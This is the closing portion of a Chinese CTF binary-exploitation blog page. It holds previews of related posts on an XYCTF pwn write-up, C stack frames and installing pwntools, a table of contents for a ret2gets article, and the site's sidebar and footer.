var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-13</div><div class="info-item-2">2025 XYCTF Pwn-wp(含附件)</div></div><div class="info-2"><div class="info-item-1">前言总体来说Pwn方向题目难度属于中等,属于那种一眼看不出要咋做,但多试试又能做出来的那种,比赛的时候甚至有几只队伍AK了Pwn方向。感觉题目还是很不错的尽管比赛中有一些小意外像是有些题目附件给错了，但是XYCTF的师傅们都是无偿出题纯热爱向大伙分享自己的题目和知识，感谢所有XYCTF出题的师傅，明年我还来打(〃&#39;▽&#39;〃) 通过网盘分享的文件：2025XYCTF.rar链接: https://pan.baidu.com/s/1yf7piV-H4U2qtXiQyo9eBw?pwd=xidp 提取码: xidp其中含有pwn方向全部赛题、官方wp、奶龙出题人提供的奶龙wp以及ddw队伍的师傅分享在群里的pwn方向全解wp Ret2libc’s...</div></div></div></a><a class="pagination-related" href="/2024/06/13/C%E7%A8%8B%E5%BA%8F%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E4%B8%8E%E5%87%BD%E6%95%B0%E6%A0%88%E5%8F%98%E5%8C%96%EF%BC%8832%E4%BD%8D%20vs%2064%E4%BD%8D%EF%BC%89(Intel)/" title="C程序调用过程与函数栈变化（32位 vs 64位）(Intel)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-13</div><div class="info-item-2">C程序调用过程与函数栈变化（32位 vs 64位）(Intel)</div></div><div class="info-2"><div class="info-item-1">本文使用Intel 的32位为例子进行举例。64位本质上和32位类似，主要区别在于函数参数的调用方式，文章结尾会简要提及。 重新回顾一下栈pop和push指令 12// 将0x50的压入栈push 0x50  1234// 将esp指向的数据放入指定的寄存器中pop 寄存器名字比如 ：pop eax执行之后eax的值就变成了0x50  栈帧是什么?栈帧，也就是stack frame，其本质就是一种栈，只是这种栈专门用于保存函数调用过程中的各种信息（参数，返回地址，本地变量等）。栈帧有栈顶和栈底之分，其中栈顶的地址最低，栈底的地址最高，SP(栈指针)就是一直指向栈顶的。在x86-32bit中，我们用 ebp 指向栈底，也就是基址指针；用 esp 指向栈顶，也就是栈指针。下面是一个栈帧的示意图： 1234567891011// 这是一段有问题的C语言代码，仅仅只是用作C语言函数调用流程的介绍，为了方便读者理解#include &lt;stdio.h&gt;void func(参数1, 参数2 ,参数3 ) &#123;	&#125;int main() &#123;   ...</div></div></div></a><a class="pagination-related" href="/2024/06/13/pwntools%E5%BA%93%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/" title="pwntools库的基本使用"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-13</div><div class="info-item-2">pwntools库的基本使用</div></div><div class="info-2"><div class="info-item-1">啥是pwntools?Pwntools 是一个用于漏洞利用和二进制分析的 Python 库，广泛应用于安全研究、渗透测试和竞争性编程（如 CTF，Capture The Flag）中。它为用户提供了一套强大的工具和功能，以简化与二进制文件的交互、网络通信以及各种常见任务的执行。 简而言之，pwntools可以说是pwn手必备的工具，它帮助pwn手连接远程服务器，发送信息，接收信息，以及提供了很多工具来帮助pwn手快速攻克题目 如何安装pwntools?按照以下流程在python3中安装pwntools 1234&gt;&gt;&gt;git clone https://github.com/Gallopsled/pwntools.git&gt;&gt;&gt;sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential&gt;&gt;&gt;python3 -m pip install --upgrade pip&gt;&gt;&gt;python3...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/Qhead.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">XiDP</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">17</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/XiDP0"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">So get away</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%E2%80%8B%E2%80%8B"><span class="toc-number">1.</span> <span class="toc-text">前言​​</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E4%B8%AD-pop-rdi-ret-%E7%9A%84%E6%9D%A5%E6%BA%90"><span class="toc-number">2.</span> <span class="toc-text">程序中 pop rdi; ret 的来源</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2gets%E5%8E%9F%E7%90%86%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">ret2gets原理和利用方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gets%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">gets源码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IO-stdfile-0-lock%E4%BB%8E%E5%93%AA%E6%9D%A5%E7%9A%84"><span class="toc-number">4.1.</span> <span class="toc-text">_IO_stdfile_0_lock从哪来的</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88-IO-stdfile-0-lock%E8%A6%81%E6%94%BE%E5%85%A5%E5%88%B0rdi%E5%AF%84%E5%AD%98%E5%99%A8%E9%87%8C%E9%9D%A2"><span class="toc-number">4.2.</span> <span class="toc-text">为什么_IO_stdfile_0_lock要放入到rdi寄存器里面</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2gets%E7%9A%84%E5%85%B7%E4%BD%93%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">4.3.</span> <span class="toc-text">ret2gets的具体利用方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%9D%E5%A4%96%E7%9A%84%E6%83%85%E5%86%B5%E5%8F%91%E7%94%9F%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E%E5%91%A2"><span class="toc-number">5.</span> <span class="toc-text">额外的情况发生了怎么办呢?</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/14/DIR-815%20%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/" title="DIR-815 栈溢出漏洞(CNVD-2013-11625)复现">DIR-815 栈溢出漏洞(CNVD-2013-11625)复现</a><time datetime="2025-06-13T16:00:00.000Z" title="发表于 2025-06-14 00:00:00">2025-06-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/13/2025%20ISCC%20%E6%93%82%E5%8F%B0%E8%B5%9BPwn-wp(%E5%90%AB%E9%99%84%E4%BB%B6)/" title="2025 ISCC 擂台赛Pwn-wp(含附件)">2025 ISCC 擂台赛Pwn-wp(含附件)</a><time datetime="2025-06-12T16:00:00.000Z" title="发表于 2025-06-13 00:00:00">2025-06-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/13/2025%20UCSCCTF%20Pwn-wp(%E5%90%AB%E9%99%84%E4%BB%B6)/" title="2025 UCSCCTF Pwn-wp(含附件)">2025 UCSCCTF Pwn-wp(含附件)</a><time datetime="2025-06-12T16:00:00.000Z" title="发表于 2025-06-13 00:00:00">2025-06-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/13/2025%20XYCTF%20Pwn-wp(%E5%90%AB%E9%99%84%E4%BB%B6)/" title="2025 XYCTF Pwn-wp(含附件)">2025 XYCTF Pwn-wp(含附件)</a><time datetime="2025-06-12T16:00:00.000Z" title="发表于 2025-06-13 00:00:00">2025-06-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/13/2025%20ISCC%20%E7%BB%83%E6%AD%A6%E8%B5%9BPwn-wp(%E5%90%AB%E9%99%84%E4%BB%B6)/" title="2025 ISCC 练武赛Pwn-wp(含附件)">2025 ISCC 练武赛Pwn-wp(含附件)</a><time datetime="2025-06-12T16:00:00.000Z" title="发表于 2025-06-13 00:00:00">2025-06-13</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/yu2.png);"><div id="footer-wrap"><div class="footer_custom_text">Let yourself go</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="(。・＿・。)ﾉ你好呀，希望博客里面的内容可以帮助到你" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>